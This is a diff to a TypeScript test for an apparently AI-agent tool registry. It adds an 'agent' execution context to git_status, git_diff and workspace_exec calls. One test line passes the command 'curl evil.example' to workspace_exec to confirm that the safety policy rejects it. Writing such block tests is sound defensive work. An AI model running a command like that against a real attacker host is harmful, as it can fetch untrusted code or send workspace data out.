@@ -1,6 +1,7 @@
 import assert from "node:assert/strict";
 import { createMuthurToolRegistry } from "../src/lib/muthur-core/tool-registry";
 import { executeMuthurChatTool } from "../src/lib/muthur-core/execute-openai-tool";
+import { createMuthurToolExecutionContext } from "../src/lib/muthur-core/types";
 import { validateShellCommand } from "../src/lib/muthur/execution/safety-policy";
 import { runGitStatus, runWorkspaceExec } from "../src/lib/muthur-core/workspace-tools.server";
 
@@ -20,16 +21,25 @@ async function main() {
   assert.ok(registry.tools.git_status);
   assert.ok(registry.tools.git_diff);
 
-  const statusText = await executeMuthurChatTool(registry, "git_status", "{}");
+  /** Phase A coding tools require Agent uplink (Plan blocks workspace_exec). */
+  const agentCtx = createMuthurToolExecutionContext("agent");
+
+  const statusText = await executeMuthurChatTool(registry, "git_status", "{}", agentCtx);
   assert.match(statusText, /GIT_STATUS/);
 
-  const diffText = await executeMuthurChatTool(registry, "git_diff", JSON.stringify({ stat: true }));
+  const diffText = await executeMuthurChatTool(
+    registry,
+    "git_diff",
+    JSON.stringify({ stat: true }),
+    agentCtx,
+  );
   assert.match(diffText, /GIT_DIFF/);
 
   const rejectExec = await executeMuthurChatTool(
     registry,
     "workspace_exec",
     JSON.stringify({ command: "curl evil.example" }),
+    agentCtx,
   );
   assert.match(rejectExec, /TOOL FAILURE/);
 
